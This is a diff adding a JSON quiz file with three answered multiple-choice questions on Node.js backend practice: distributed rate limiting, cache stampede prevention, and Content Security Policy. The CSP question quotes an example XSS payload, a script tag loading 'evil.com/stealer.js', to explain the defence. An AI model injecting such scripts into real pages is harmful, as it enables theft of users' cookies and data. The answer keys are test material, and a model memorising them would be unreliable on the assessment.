@@ -1,0 +1,37 @@
+{
+    "questions": [
+        {
+            "question": "Rate limiting with express-rate-limit defaults to storing state in memory on a single server. Why is this a critical problem in a horizontally-scaled production environment, and what is the fix?",
+            "options": [
+                "In-memory storage is fine for production — each server independently enforces the limit.",
+                "When you have 3 server instances behind a load balancer, each server has independent in-memory rate limit state. User A's 100 requests are distributed across 3 servers (~33 each) — none sees 100 requests, none triggers the limit. The effective limit becomes 300 (100 × 3 servers), defeating rate limiting's purpose. Fix: use a shared Redis store (rate-limit-redis) so all server instances share one centralized rate limit counter per user.",
+                "In-memory rate limiting causes race conditions that crash Node.js worker threads.",
+                "express-rate-limit only supports Redis — in-memory is not a default option."
+            ],
+            "answer": "When you have 3 server instances behind a load balancer, each server has independent in-memory rate limit state. User A's 100 requests are distributed across 3 servers (~33 each) — none sees 100 requests, none triggers the limit. The effective limit becomes 300 (100 × 3 servers), defeating rate limiting's purpose. Fix: use a shared Redis store (rate-limit-redis) so all server instances share one centralized rate limit counter per user.",
+            "explanation": "This is a very common production bug: rate limiting 'works' in development (single server) but fails under load (multiple servers). Redis as a centralized store ensures all instances increment the same counter. Apply the same logic to session storage, distributed locks, and any stateful server-side operations."
+        },
+        {
+            "question": "When implementing a Redis cache invalidation strategy for a REST API, what is the cache stampede problem and how do you prevent it?",
+            "options": [
+                "Cache stampede is when a cached value is too large for Redis memory — solved by reducing value size.",
+                "Cache stampede: a popular cached item expires. Simultaneously, hundreds of requests see a cache miss and each fires a database query to regenerate the cache simultaneously. The DB is hammered with hundreds of identical heavy queries. Prevention: probabilistic early expiration (refresh slightly before expiry for popular items, decided probabilistically), or lock-based cache warming: the first cache miss acquires a Redis lock, generates the value, and stores it — other requests wait briefly for the new cached value.",
+                "Cache stampede is a security attack that floods Redis with SET operations.",
+                "Cache stampede only occurs in write-heavy APIs — read-heavy APIs are immune."
+            ],
+            "answer": "Cache stampede: a popular cached item expires. Simultaneously, hundreds of requests see a cache miss and each fires a database query to regenerate the cache simultaneously. The DB is hammered with hundreds of identical heavy queries. Prevention: probabilistic early expiration (refresh slightly before expiry for popular items, decided probabilistically), or lock-based cache warming: the first cache miss acquires a Redis lock, generates the value, and stores it — other requests wait briefly for the new cached value.",
+            "explanation": "A simpler prevention: stale-while-revalidate pattern. Serve the slightly stale cached value to ALL requests after expiry while ONLY ONE background process regenerates the cache. This decouples cache regeneration from request serving, eliminating the stampede entirely at the cost of brief staleness."
+        },
+        {
+            "question": "Why does Helmet.js's Content Security Policy (CSP) header prevent XSS attacks even when an attacker has successfully injected a <script> tag into your HTML?",
+            "options": [
+                "CSP strips all script tags from the HTML response before sending to the browser.",
+                "CSP declares a whitelist of trusted sources from which the browser is permitted to load and execute scripts. Even if an attacker injects <script>maliciousCode()</script> or <script src='evil.com/stealer.js'></script>, the browser won't execute the script because the sources ('evil.com', inline scripts) are not in your CSP policy. The attack is rendered harmless at the browser enforcement level. Without CSP, any injected script runs with full access to your page's cookies and localStorage.",
+                "CSP encrypts all JavaScript bundles making them impossible for attackers to read.",
+                "CSP only prevents image-based attacks, not script injection."
+            ],
+            "answer": "CSP declares a whitelist of trusted sources from which the browser is permitted to load and execute scripts. Even if an attacker injects <script>maliciousCode()</script> or <script src='evil.com/stealer.js'></script>, the browser won't execute the script because the sources ('evil.com', inline scripts) are not in your CSP policy. The attack is rendered harmless at the browser enforcement level. Without CSP, any injected script runs with full access to your page's cookies and localStorage.",
+            "explanation": "Defense in depth: you should both prevent XSS injection (input sanitization, parameterized queries) AND enforce CSP (defense if prevention fails). 'unsafe-inline' in scriptSrc defeats CSP entirely by allowing injected inline scripts. Use nonces or hashes for legitimate inline scripts instead of 'unsafe-inline'."
+        }
+    ]
+}
